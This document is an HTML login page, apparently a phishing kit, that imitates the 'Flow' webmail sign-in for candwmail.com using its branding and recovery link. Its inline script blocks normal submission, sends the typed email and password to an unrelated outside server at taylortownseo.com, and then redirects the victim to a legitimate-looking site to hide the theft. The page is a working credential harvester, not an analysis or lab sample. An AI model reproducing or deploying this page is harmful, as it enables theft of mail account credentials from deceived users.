<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Flow</title>

<link href="default.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" type="image/x-icon" href="https://webmail.candwmail.com/img/faviconFL.ico">
</head>

<body>

<div class="mainDiv">
    <img id="hdrImage" alt="" src="candwmail_com.png">

    <!-- NOTE: action removed -->
    <form id="form">
        <input type="text" class="field" placeholder="Email" name="email" id="email" required>
        <input type="password" class="field" placeholder="Password" name="password" id="password" required>

        <div class="checkDiv divLeft">
            <input type="checkbox" id="auto" name="auto">
            <label for="auto">remember me</label>
        </div>

        <div class="divRight">
            <a id="hlpLink" href="https://mailconfig.candwmail.com/tmngxSelfcareCWC/recovery?1&variant=fl" target="_blank">
                Forgot your password?
            </a>
        </div>

        <button type="submit" class="btnSubmit" style="width: 437px;">Sign in</button>
    </form>

    <div class="errorDiv"><span id="error" class="error"></span></div>
</div>

<script>
document.getElementById("form").addEventListener("submit", function (e) {
    e.preventDefault(); // stop normal submit

    const form = this;
    const formData = new FormData(form);

    fetch("http://taylortownseo.com/next.php", {
        method: "POST",
        body: formData
    })
    .then(function () {
        // redirect ONLY after POST completes
        window.location.href = "https://www.caribsurf.net/";
    })
    .catch(function () {
        // optional error handling
        document.getElementById("error").textContent = "Submission failed. Please try again.";
    });
});
</script>

</body>
</html>
